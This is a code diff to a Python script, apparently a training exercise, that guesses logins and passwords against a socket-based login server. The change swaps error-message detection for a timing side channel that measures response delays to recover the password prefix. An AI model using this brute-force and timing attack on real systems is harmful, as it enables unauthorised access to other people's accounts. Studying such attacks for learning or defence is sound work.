@@ -1,5 +1,6 @@
 import json
 import string
+import time
 from itertools import product
 import socket
 import sys
@@ -15,26 +16,15 @@ def get_resp(sock, log, pw):
     resp = json.loads(resp)
     return resp['result']
 
-def get_resp1(txt1, txt2):
-    msg = txt1 if random() < 0.2 else txt2
-    resp = json.dumps({
-        'result': msg
-        })
-    resp = json.loads(resp)
-    return resp['result']
-
-
 def recvest():
     address = (hostname, port)
     gl = gen_login()
     with socket.socket() as sock:
         try:
             sock.connect(address)
-            cur_pass = ' '
             while True:
                 cur_log = next(gl)
                 resp = get_resp(sock, cur_log, ' ')
-                # resp = get_resp1("Wrong password!", "Wrong login!")
                 if resp != "Wrong password!":
                     continue
                 login_ = cur_log
@@ -42,9 +32,12 @@ def recvest():
                 gp = gen_pass(0)
                 while True:
                     cur_pass = pass_ + next(gp)
+                    start = time.perf_counter()
                     resp = get_resp(sock, login_, cur_pass)
-                    # resp = get_resp1("Exception happened during login", "Connection success!")
-                    if "Exception happened during login" in resp:
+                    stop = time.perf_counter()
+                    dur = (stop - start) * 1000
+                    # print(dur)
+                    if resp == "Wrong password!" and dur > 90:
                         pass_ = cur_pass
                         gp = gen_pass(0)
                         continue
